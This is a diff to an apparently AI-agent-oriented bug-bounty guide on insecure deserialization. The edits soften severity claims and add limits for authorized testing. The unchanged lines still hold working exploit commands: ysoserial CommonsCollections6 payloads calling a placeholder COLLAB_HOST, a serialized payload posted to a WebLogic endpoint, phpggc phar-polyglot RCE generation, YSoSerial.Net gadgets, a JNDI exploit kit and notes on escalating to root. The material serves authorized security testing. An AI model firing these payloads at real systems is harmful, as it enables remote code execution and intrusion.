@@ -33,7 +33,7 @@ report_count: 22
 
 ## Crown Jewel Targets
 
-Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.
+Deserialization severity depends on attacker control, reachable deserialization, available gadgets, privileges and demonstrated impact; a signal alone is not RCE.
 
 **Highest-value chains:**
 - **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
@@ -85,7 +85,7 @@ java -jar ysoserial-all.jar CommonsCollections6 \
   'curl http://COLLAB_HOST/ysoserial' | base64 -w0
 
 # Send as body or cookie
-java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \
+java -jar ysoserial-all.jar CommonsCollections6 'id' | \
   curl -s https://$TARGET/wls-wsat/CoordinatorPortType \
     -H "Content-Type: application/x-java-serialized-object" \
     --data-binary @-
@@ -101,7 +101,7 @@ grep -r "unserialize(" --include="*.php" .
 
 # Inject test: O:8:"stdClass":1:{s:4:"test";s:5:"value";}
 # Send in cookie, POST param, or hidden form field
-# If error changes → deserialization confirmed
+# Error changes are a lead; use approved controls and source/runtime evidence.
 
 # Craft gadget chain using phpggc
 # Prerequisite: an existing reviewed phpggc installation; stop if absent.
@@ -127,7 +127,7 @@ curl -s https://$TARGET/api/load-model \
 ```
 
 ### Phase 3b — PHP phar://, Python YAML, Node deserialization
-- **PHP phar:// (no `unserialize()` call)** — any filesystem function (`file_exists`/`fopen`/`getimagesize`) on a `phar://` path deserializes the archive metadata -> object injection with zero `unserialize()` in code.
+- **PHP phar:// (no `unserialize()` call)** — older PHP runtimes could automatically deserialize metadata through filesystem access. PHP 8 stopped that automatic behavior; explicit `getMetadata()` may still deserialize. Verify the exact version/call path.
   ```bash
   phpggc -p phar -o poly.jpg Monolog/RCE1 system id   # valid-image + phar polyglot
   # then reach  phar://uploads/poly.jpg/x  via any fs call
@@ -140,7 +140,8 @@ curl -s https://$TARGET/api/load-model \
 ### Phase 4 — .NET ViewState
 ```bash
 # Check if ViewState is unsigned (MAC disabled)
-# Look for __VIEWSTATE in HTML source without __VIEWSTATEMAC
+# Presence of __VIEWSTATE or absence of a separate __VIEWSTATEMAC field does
+# not prove MAC is disabled. Verify configuration and controlled tamper behavior.
 
 # YSoSerial.Net
 dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
@@ -176,9 +177,9 @@ grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .
 
 | Deserialization signal | Chain to | Impact |
 |-----------------------|----------|--------|
-| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
+| Confirmed lab RCE | Harmless unique marker | Demonstrate minimum authorized effect |
 | RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
-| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
+| Blind RCE (OOB callback) | DNS callback → investigate originating path | Outbound interaction only until execution is proven |
 | Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |
 
 ---
@@ -196,10 +197,10 @@ git clone https://github.com/pimps/JNDI-Exploit-Kit
 
 ## Validation
 
-✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
+✅ A correlated DNS/HTTP callback supports outbound interaction; it does not alone prove deserialization or command execution
 ✅ Command output in response: full RCE confirmed
 
-**Severity:** Almost always **Critical** — RCE with server process privileges.
+**Severity:** Assess the demonstrated effect and prerequisites; do not assign Critical from a fingerprint or callback alone.
 
 ## When to Use
 
@@ -220,3 +221,5 @@ cat scope.txt  # target list from the authorized engagement brief
 ```
 
 > Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
+
+The direct binary-body example sends serialized bytes; base64 is only correct when the target explicitly decodes it. The Python example prints base64 but does not create `payload.pkl`; do not send a nonexistent/different artifact. JNDI lookup is not automatically class loading/RCE on patched JVMs. Keep tests bounded, use a unique controlled callback, do not read secrets/escalate privileges/write persistent files, and stop at the authorized proof. Review/pin any external kit before use. See [PHP implemented metadata change](https://wiki.php.net/rfc/phar_stop_autoloading_metadata).
